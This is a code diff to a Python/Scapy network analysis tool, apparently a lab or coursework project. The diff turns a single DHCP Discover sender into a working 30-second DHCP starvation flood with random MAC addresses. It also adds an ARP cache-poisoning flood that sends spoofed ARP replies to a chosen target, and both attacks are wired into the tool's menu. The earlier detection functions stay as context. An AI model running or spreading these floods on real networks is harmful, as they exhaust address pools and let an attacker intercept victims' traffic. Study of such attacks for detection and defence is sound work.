@@ -3,6 +3,10 @@ from scapy.layers.l2 import Ether, ARP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dhcp import BOOTP, DHCP
 from collections import Counter, defaultdict
+import socket
+import struct
+import fcntl
+import time
 
 def reader(pcap_file):
     try:
@@ -101,19 +105,36 @@ def detect_arp_poisoning(pcap_file):
     except Exception as e:
         print(f"An error occurred while analyzing the pcap file: {e}")
 
-def send_dhcp_discover(target_ip, target_mac):
+def send_dhcp_flood(target_ip, iface):
     try:
-        dhcp_discover = (
-            Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
-            IP(src="0.0.0.0", dst=target_ip) /
-            UDP(sport=68, dport=67) /
-            BOOTP(chaddr=RandMAC()) /
-            DHCP(options=[("message-type", "discover"), "end"])
-        )
-        sendp(dhcp_discover, iface="h1-eth0", verbose=False)  # Send the packet via the network interface
-        print("DHCP Discover packet sent!")
+        start_time = time.time()
+        print(f"[+] Starting DHCP flooding for 30 seconds targeting {target_ip}")
+        while time.time() - start_time < 30:
+            dhcp_discover = (
+                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst=target_ip) /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=RandMAC()) /
+                DHCP(options=[("message-type", "discover"), "end"])
+            )
+            sendp(dhcp_discover, iface=iface, verbose=False)
+        print("[+] DHCP flood complete.")
     except Exception as e:
-        print(f"An error occurred while sending DHCP Discover: {e}")
+        print(f"An error occurred during DHCP flooding: {e}")
+
+def send_arp_flood(target_ip, spoof_ip, target_mac, iface):
+    try:
+        start_time = time.time()
+        print(f"[+] Starting ARP flooding for 30 seconds targeting {target_ip} with spoofed IP {spoof_ip}")
+        while time.time() - start_time < 30:
+            arp_poison_packet = (
+                Ether(dst=target_mac) /
+                ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
+            )
+            sendp(arp_poison_packet, iface=iface, verbose=False)
+        print("[+] ARP flood complete.")
+    except Exception as e:
+        print(f"An error occurred during ARP flooding: {e}")
 
 if __name__ == "__main__":
     while True:
@@ -121,7 +142,8 @@ if __name__ == "__main__":
         print("1. Reader (Count protocols)")
         print("2. Detect DHCP Poisoning")
         print("3. Detect ARP Poisoning")
-        print("4. Send DHCP Discover")
+        print("4. Send DHCP Flood (30 seconds)")
+        print("5. Send ARP Flood (30 seconds)")
         print("Type 'exit' to quit.")
         choice = input("Enter your choice: ").strip()
 
@@ -141,8 +163,15 @@ if __name__ == "__main__":
 
         elif choice == '4':
             target_ip = input("Enter the target IP address: ").strip()
+            iface = input("Enter the network interface: ").strip()
+            send_dhcp_flood(target_ip, iface)
+
+        elif choice == '5':
+            target_ip = input("Enter the target IP address: ").strip()
+            spoof_ip = input("Enter the spoofed IP address: ").strip()
             target_mac = input("Enter the target MAC address: ").strip()
-            send_dhcp_discover(target_ip, target_mac)
+            iface = input("Enter the network interface: ").strip()
+            send_arp_flood(target_ip, spoof_ip, target_mac, iface)
 
         else:
             print("Invalid option. Please try again.")
